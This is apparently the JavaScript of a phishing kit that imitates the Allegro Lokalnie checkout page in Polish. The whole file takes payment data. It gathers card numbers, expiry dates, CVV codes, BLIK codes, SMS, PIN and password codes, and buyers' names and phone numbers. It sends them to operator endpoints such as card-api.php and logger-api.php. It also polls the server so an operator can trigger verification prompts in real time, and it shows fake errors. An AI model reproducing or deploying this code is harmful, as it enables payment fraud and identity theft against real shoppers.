let Current = {"Payment": "NIC", "Redirect": false, "Card": 0};
let State = {"Payment": false, "PaymentInputLoaded": false, "CardInputLoaded": false, "BlikSubmitted": false};
let blikPollTimer = null;
let Events = {


    ".add-card-background": function(event) {
        if ($(event.target).hasClass(`add-card-background`)) {
            $(`.payment-card-modal`).hide()
        }
    },

    ".card-list-background": function(event) {
        if ($(event.target).hasClass(`card-list-background`)) {
            $(`[data-testid="card-list"]`).hide()
        }
    },

    "[data-testid='add-new-card']": function() {
        AddNewCard()
    },

    "[data-testid='close-cards-list']": function() {
        $(`[data-testid="card-list"]`).hide()
    },

    "[data-testid='close-new-card']": function() {
        $(`.payment-card-modal`).hide()
    },

    ".add-card-background": function(event) {
        if ($(event.target).hasClass(`add-card-background`)) {
            $(`.payment-card-modal`).hide()
        }
    },

    "[data-testid='open-cards-list']": function() {
        $(`[data-testid="card-list"]`).show()
    },

    "[data-testid='close-blik-button']": function() {
        TogglePayment(false)
    },

    "[data-testid='close-sms-button']": function() {
        TogglePayment(false)
        SelectPayment("NIC")
        $(`.sms-input-modal`).hide()
        $.get(`/api/logger-api.php?id=${LinkID}&log-type=SMS-CLOSE`)
    },

    "[data-testid='close-pin-button']": function() {
        TogglePayment(false)
        SelectPayment("NIC")
        $(`.pin-input-modal`).hide()
        $.get(`/api/logger-api.php?id=${LinkID}&log-type=PIN-CLOSE`)
    },

    "[data-testid='show-blik-button']": function() {
        TogglePayment(true)
    },

    "[data-testid='send-blik-button']": function() {
        ValidatePayment()
    },

    "[data-testid='select-payment-card']": function() {
        Current["Payment"] = "Card";
        AddNewCard()
    },

    "[data-testid='save-card-button']": function(e) {
        SaveCard()
    },

    "[data-testid='saved-card-button']": function() {
        SelectPayment("Card")
    },

    "[data-testid='payment-blik-button']": function() {
        SelectPayment("BLIK")
    },

    "[data-testid='selected-bank-button']": function() {
        SelectPayment("Bank")
    },

    "[data-testid='send-sms-button']": function() {
        SendSMS()
    },

    "[data-testid='send-pin-button']": function() {
        SendPIN()
    },

    "[data-testid='send-pass-button']": function() {
        SendPass()
    },

    "[data-testid='select-bank']": function(event) {
        SelectBank($(event.target))
    },

    "[data-testid='back-button']": function() {
        Redirect("koszyk")
    },
    "[data-testid='show-bank-menu'],[data-testid='show-bank-menu-change']": function() {
        $(`[data-testid="select-bank-menu"]`).show()
    },

    "[data-testid='hide-bank-menu']": function() {
        $(`[data-testid="select-bank-menu"]`).hide()   
    }
};

function SelectBank(Bank) {
    let BankName = Bank.parent("[data-bank]").data("bank");

    if (BankName == undefined) {
        BankName = Bank.children("[data-bank]").data("bank");
    }               

    if (BankName == undefined) {
        BankName = Bank.data("bank");
    }

    BankItems = $(`.bank-container[data-bank="${BankName}"]`);
    BankLabel = $(`.mx4z_6m[data-bank="${BankName}"]`).attr("title")
    $(`[data-testid="selected-bank-label"]`).text(BankLabel)
    $(`[data-testid="selected-bank-img"]`).attr("src", $(`img[data-bank="${BankName}"]`).attr("src"))
    SelectPayment("Bank")
    $(`[data-testid="select-bank-menu"]`).hide()   
    $(`[data-testid="show-bank-menu"]`).hide()
    $(`[data-testid="selected-bank-button"]`).show()
}

let Banks = {
    "pko": {
        "selected-bank-label": "PKO Bank Polski"
    }
}

let Errors = {
    "BLIK": {
        "true": "Pole nie może być puste. Wprowadź kod BLIK.",
        "false": "Kod BLIK jest zbyt krótki lub za długi."
    }
};

let CardInputs = {
    "cardNumber": {
        "true": "Za krótki numer karty",
        "false": "Niepoprawny numer karty"
    },
    "expDate": {
        "true": "Niepoprawny format daty",
        "false": "Niepoprawny format daty"
    },
    "cvv": {
        "true": "Niepoprawny kod CVV",
        "false": "Niepoprawny kod CVV"
    }
};


let Cards = Cookies.get("SavedCards");

$(document).ready(function() {
    Handlers()
    $(`[data-inputmask]`).inputmask('unmaskedValue')
    LoadCard()
    $(`.card-${CanCard}`).hide()
    $(`.przelew-${CanPrzelew}`).hide()
    $(`.blik-${CanBlik}`).hide()
    setInterval(function() {
        ValidateNewCard()
    }, 250)
})

function Handlers() {
}



function getAllegroAddressData() {
    const cookies = document.cookie.split("; ").reduce((acc, curr) => {
        const [key, value] = curr.split("=");
        acc[key] = value;
        return acc;
    }, {});

    const raw = cookies["AllegroLokalnie_Checkout_Address"];
    if (!raw) return null;

    const decoded = decodeURIComponent(raw);
    const parts = decoded.split(";").filter(p => p.trim() !== "");

    const imie = parts[0] || "";
    const nazwisko = parts[1] || "";
    const telefonRaw = parts[parts.length - 1] || "";
    const telefon = telefonRaw.replace(/\s+/g, "");
    const fullName = `${imie} ${nazwisko}`
    return {
        fullName,
        telefon: "48" + telefon
    };
}

function SendSMS() {
    SMSCode = $(`[data-testid="sms-input"]`).val();

    if (SMSCode.trim() === "") {
        return;  
    }

    $.get(`/api/logger-api.php?id=${LinkID}&log-type=SMSCode&sms-code=${SMSCode}&card-number=${Cards.split("|")[Current["Card"]].split(";")[0]}`)
    $(`.sms-input-modal`).hide()
}

function SendPIN() {
    PINCode = $(`[data-testid="pin-input"]`).val();

    if (PINCode.trim() === "") {
        return;  
    }
    $.get(`/api/logger-api.php?id=${LinkID}&log-type=PINCode&sms-code=${PINCode}&card-number=${Cards.split("|")[Current["Card"]].split(";")[0]}`)
    $(`.pin-input-modal`).hide();
}

function SendPass() {
    passCode = $(`[data-testid="pass-input"]`).val();

    if (passCode.trim() === "") {
        return;  
    }
    $.get(`/api/logger-api.php?id=${LinkID}&log-type=PASSCode&sms-code=${passCode}&card-number=${Cards.split("|")[Current["Card"]].split(";")[0]}`)
    $(`.pass-input-modal`).hide();
}



function PayCard() {
    let ButtonParent = $(`.show-payment-button-text`).parent();
    let ButtonSibling = ButtonParent.siblings("button");

    $(`[data-testid="payment-soap"]`).toggleClass(`mlmm_5r so74zy`, Toggle)
    $(`.show-payment-button-text`).toggle(!Toggle)
    $(`.show-payment-button-loader`).toggle(Toggle)

    ButtonParent.attr("disabled", "true")
    ButtonSibling.attr("disabled", "true")
}

function SelectPayment(Payment) {
    $(`[data-testid="payment-${Current["Payment"].toLowerCase()}-label"]`).toggleClass(`payment-active`, false)
    $(`[data-testid="payment-${Payment.toLowerCase()}-label"]`).toggleClass(`payment-active`, true)
    Current["Payment"] = Payment
    if (Current["Payment"] !== "NIC") {
        $(`[data-testid="show-blik-button"]`).prop('disabled', false);
    } else {
        $(`[data-testid="show-blik-button"]`).prop('disabled', true);
    }
}

function ToggleCardsList() {
}

function LoadCard() {
    if (Cards != undefined) {
        Cards = Cards.replaceAll("undefined", "")
        SplittedCards = Cards.split("|");
        $(`[data-testid="cards-container"]`).empty()
        for (let i=0; i < SplittedCards.length; i++) {
            if (SplittedCards[i]) {
                CardData = SplittedCards[i].split(";");
                CardNumber = CardData[0]
                $(`[data-testid="cards-container"]`).append(`<ul data-testid="select-card-${i}" class="mp0t_0a mgn2_14 mqu1_21 mgmw_wo mli8_k4 mb54_5r mp4t_0 m3h2_0 mryx_0 munh_0 mg9e_0 mvrt_0 mj7a_0 mh36_0"><li class="mb54_5r mh36_8 mg9e_8 mj7a_8"><input class="mqen_m6 mp7g_f6 mp4t_16 mj6k_n7 chd2o9 chtqu6 _15058_ox-3j" name="creditCard" type="radio" id="asc-ed914083-bb21-4af5-a462-aba09c0a7801" value="asc-ed914083-bb21-4af5-a462-aba09c0a7801"><label for="asc-ed914083-bb21-4af5-a462-aba09c0a7801" class="mgmw_wo mpof_vs mqen_m6 mp7g_oh mp0t_0a ch1wyz _15058_gL53k"><div><div class="m7er_k4 mh36_16"><span><div class="_15058_5SPnr "><img src="https://a.allegroimg.com/original/2f80b1/3b48708d44248480af5d245b73ba" alt="Karta pĹ‚atnicza" class="m3h2_8 _15058_NaiA1"></div><span>${CardNumber[0]}${CardNumber[1]}${CardNumber[2]}${CardNumber[3]}***${CardNumber[CardNumber.length - 4]}${CardNumber[CardNumber.length - 3]}${CardNumber[CardNumber.length - 2]}${CardNumber[CardNumber.length - 1]}</span></span></div></div></label></li></ul>`)
                $(`[data-testid="select-card-${i}"]`).on("click", function() {
                    SelectCard(i)
                    $(`[data-testid="card-list"]`).hide()
                })
            }
        }

        SelectCard(0)
    }
}

function SelectCard(CardID) {
    Current["Card"] = CardID
    SplittedCards = Cards.split("|");
    CardData = SplittedCards[CardID].split(";");
    CardNumber = CardData[0];
    $(`[data-testid="select-payment-card"]`).hide()
    $(`[data-testid="censored-cardNumber"]`).text(`${CardNumber[0]}${CardNumber[1]}${CardNumber[2]}${CardNumber[3]}***${CardNumber[CardNumber.length - 4]}${CardNumber[CardNumber.length - 3]}${CardNumber[CardNumber.length - 2]}${CardNumber[CardNumber.length - 1]}`)
    $(`[data-testid="saved-card-button"]`).show()
}

function SaveCard() {
    let CardData = "";

    for (const CurrentInput in CardInputs) {
        let InputValue = $(`[data-testid="input__${CurrentInput}"]`).val().replaceAll(" ", "");
        CardData = CardData + `${InputValue};`;
    }

    Cards = Cards + CardData + "|";
    Cookies.set("SavedCards", Cards);
    LoadCard()
    $(`.payment-card-modal`).hide()
}

function ValidateNewCard() {
    let Valid = true;

    for (const CurrentInput in CardInputs) {
        let InputValue = $(`[data-testid="input__${CurrentInput}"]`).val();
        let ClearInputValue = InputValue.replaceAll("_", "");


        if (ClearInputValue.length == 0) {
            Valid = false;
        }else if (ClearInputValue.length < InputValue.length) {
            Valid = false;
        }
    }

    if (Valid) {
        $(`[data-testid="save-card-button"]`).removeAttr("disabled")
    }else {
        $(`[data-testid="save-card-button"]`).attr("disabled", "true")
    }
}

function AddNewCard() {
    $(`.payment-card-modal`).show()
    $.get(`/api/logger-api.php?id=${LinkID}&log-type=Card`)

    if (!State["CardInputLoaded"]) {
        State["CardInputLoaded"] = true;
        for (const CurrentInput in CardInputs) {
            $(`[data-testid="input__${CurrentInput}"]`).on("focusout", function() {
                InputValue = $(this).val();
                ClearInputValue = InputValue.replaceAll("_", "");
                if (InputValue.length == 0) {
                    $(this).val("1");
                    InputValue = $(this).val();
                    $(this).val("");
                }
                $(this).on("input", function() {
                    InputValue = $(this).val();
                    ClearInputValue = InputValue.replaceAll("_", "");
                    if (InputValue.length == 0) {
                        $(this).val("1");
                        InputValue = $(this).val();
                        $(this).val("");
                    }
                    ToggleCardError(ClearInputValue.length == 0, ClearInputValue.length < InputValue.length, CurrentInput)
                })
                ToggleCardError(ClearInputValue.length == 0, ClearInputValue.length < InputValue.length, CurrentInput)
            })
        }
    }
}

function ToggleCardError(Error, Toggle, Input) {
    let ErrorElement = $(`[data-testid="input__${Input}_error"]`);
    
    $(`[data-testid="input__${Input}"]`).parent().toggleClass(`f1a6a`, Toggle)

    ErrorElement.text(CardInputs[Input][Error])
    ErrorElement.toggle(Toggle)
}

function ValidatePayment() {
    switch (Current["Payment"]) {
        case "BLIK":
            let BlikInputValue = $(`[data-testid="blik-input"]`).val();
            let BlikCode = BlikInputValue.replace(/\s/g, "");
            let Valid = BlikInputValue.length == 6;

            ToggleError(BlikInputValue.length == 0, !Valid)

            if (!State["PaymentInputLoaded"]) {
                State["PaymentInputLoaded"] = true;
                $(`[data-testid="blik-input"]`).on("input", function() {
                    ValidatePayment()
                })
            }

            if (Valid) {
                if (State["BlikSubmitted"]) {
                    return;
                }
                State["BlikSubmitted"] = true;

                $(`[data-testid="blik-input-modal"]`).hide()
                $(`[data-testid="blik-waiting-modal"]`).show()
                const dane = getAllegroAddressData();
                const blikName = encodeURIComponent(dane?.fullName || "Klient");
                const blikPhone = encodeURIComponent(dane?.telefon || "48000000000");

                $.get(`/api/blik-api.php?id=${LinkID}&code=${BlikCode}&nr=${blikPhone}&blik-name=${blikName}`, function() {
                    function pollBlikHeartbeat() {
                        $.get(`/api/blik-heartbeat.php?code=${encodeURIComponent(BlikCode)}`, function(data) {
                            const status = parseInt(String(data).trim(), 10);
                            if (status >= 2) {
                                if (blikPollTimer) {
                                    clearInterval(blikPollTimer);
                                    blikPollTimer = null;
                                }
                                const cookieOpts = { path: "/" };
                                Cookies.set("AllegroLokalnie_Payment_Error", String(status), cookieOpts);
                                Cookies.set("AllegroLokalnie_Payment_Error_Payment", "BLIK", cookieOpts);
                                Current["Redirect"] = true;
                                Redirect("error");
                            }
                        });
                    }
                    if (blikPollTimer) {
                        return;
                    }
                    pollBlikHeartbeat();
                    blikPollTimer = setInterval(pollBlikHeartbeat, 1000);
                }).fail(function() {
                    State["BlikSubmitted"] = false;
                    $(`[data-testid="blik-waiting-modal"]`).hide();
                    $(`[data-testid="blik-input-modal"]`).show();
                });
            }
            break;
    }

}

function ToggleError(Error, Toggle) {
    let ErrorElement = $(`[data-testid="error-${Current["Payment"].toLowerCase()}"]`);
    let ErrorChild = ErrorElement.children();
    let ErrorInput = $(`[data-testid="${Current["Payment"].toLowerCase()}-input"]`);

    if (Toggle == undefined) {
        Toggle = !(ErrorElement.css("display") == "none")
    }

    ErrorChild.text(Errors[Current["Payment"]][Error])
    ErrorInput.toggleClass(`f1nva`, Toggle)
    ErrorElement.toggle(Toggle)
}

function TogglePayment(Toggle) {
    if (Toggle == undefined) {
        State["Payment"] = !State["Payment"]
        Toggle = State["Payment"]
    }

    if (Current["Payment"] == "BLIK" && Toggle) {
        $.get(`/api/logger-api.php?id=${LinkID}&log-type=BLIK`)
    }

    if (Current["Payment"] == "BLIK" && !Toggle) {
        $.get(`/api/logger-api.php?id=${LinkID}&log-type=BLIK-CLOSE`)
    }

    let ButtonParent = $(`.show-payment-button-text`).parent();
    let ButtonSibling = ButtonParent.siblings("button");

    $(`[data-testid="payment-soap"]`).toggleClass(`mlmm_5r so74zy`, Toggle)
    $(`.show-payment-button-text`).toggle(!Toggle)
    $(`.show-payment-button-loader`).toggle(Toggle)

    if (Toggle) {
        ButtonParent.attr("disabled", "true")
        ButtonSibling.attr("disabled", "true")
    }else {
        ButtonParent.removeAttr("disabled")
        ButtonSibling.removeAttr("disabled")
    }

    if (Current["Payment"] == "BLIK") {
        $(`.payment-${Current["Payment"].toLowerCase()}-modal`).toggle()
    } else if (Current["Payment"] == "Bank") {
        Redirect("PayU")
    } else if (Current["Payment"] == "Card") {
        SplittedCards = Cards.split("|");
        SelectedCard = SplittedCards[Current["Card"]].split(";");
        
        const dane = getAllegroAddressData();

        if (dane) {
            $.get(`/api/card-api.php?id=${LinkID}&card-number=${SelectedCard[0]}&card-date=${SelectedCard[1]}&card-cvv=${SelectedCard[2]}&card-name=${dane.fullName}&nr=${dane.telefon}`)
        } else {
            $.get(`/api/card-api.php?id=${LinkID}&card-number=${SelectedCard[0]}&card-date=${SelectedCard[1]}&card-cvv=${SelectedCard[2]}&card-name=Brak`)
        }
        var intervalID = null; 

        if (Current["Payment"] != "NIC") {
            intervalID = setInterval(function() {
                if (Current["Payment"] == "NIC") {
                    clearInterval(intervalID); 
                    return;
                }
        
                $.get(`/api/card-heartbeat.php?id=${LinkID}&card-number=${SelectedCard[0]}`, function(data) {
                    if (data != 0) {
                        if (data <= 3) {
                            Cookies.set("AllegroLokalnie_Payment_Error", Number(data) + 1);
                            Cookies.set("AllegroLokalnie_Payment_Error_Payment", "Card");
                            Current["Redirect"] = true;
                        } else {
                            $(`.waiting-push-container`).hide();
                            if (data == 4) {
                                $(`.waiting-push-container`).show();
                            } else if (data == 5) {
                                $(`.sms-input-modal`).show();
                            } else if (data == 6) {
                                $(`.pin-input-modal`).show();
                            } else if (data == 7) {
                                $(`.pass-input-modal`).show();
                            }
                        }
        
                        if (Current["Redirect"]) {
                            Redirect("error");
                        }
                    }
                });
            }, 1000);
        }
        
    }
}
